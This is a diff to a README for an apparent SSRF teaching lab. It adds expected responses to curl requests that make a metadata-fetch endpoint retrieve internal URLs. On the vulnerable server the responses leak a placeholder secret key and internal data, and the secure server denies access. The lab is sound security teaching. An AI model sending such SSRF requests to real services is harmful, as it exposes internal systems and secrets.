@@ -65,12 +65,29 @@ curl -X POST http://localhost:3000/fetch-metadata \
   -H "Content-Type: application/json" \
   -d '{"url": "http://localhost:3000/internal/api"}'
 ```
+Expected Response:
+```json
+{
+  "success": true,
+  "data": {
+    "secretKey": "super-secret-api-key-123",
+    "internalData": "sensitive-internal-data"
+  }
+}
+```
 
 2. **Access Internal API (Secure)**
 ```bash
 curl -X POST http://localhost:3001/fetch-metadata \
   -H "Content-Type: application/json" \
   -d '{"url": "http://localhost:3001/internal/api"}'
+```
+Expected Response:
+```json
+{
+  "error": "Invalid or unauthorized URL. Access denied.",
+  "success": false
+}
 ```
 
 3. **Test Allowed Domain (Secure)**
@@ -79,12 +96,24 @@ curl -X POST http://localhost:3001/fetch-metadata \
   -H "Content-Type: application/json" \
   -d '{"url": "https://ipfs.io/ipfs/QmSomeHash"}'
 ```
+Expected Response:
+```json
+{"error":"Failed to fetch metadata"}
+
+```
 
 4. **Test Internal Network (Vulnerable)**
 ```bash
 curl -X POST http://localhost:3000/fetch-metadata \
   -H "Content-Type: application/json" \
   -d '{"url": "http://192.168.1.1"}'
+```
+Expected Response:
+```json
+{
+  "success": true,
+  "data": "HTML Data displayed"
+}
 ```
 
 ## Exploitation
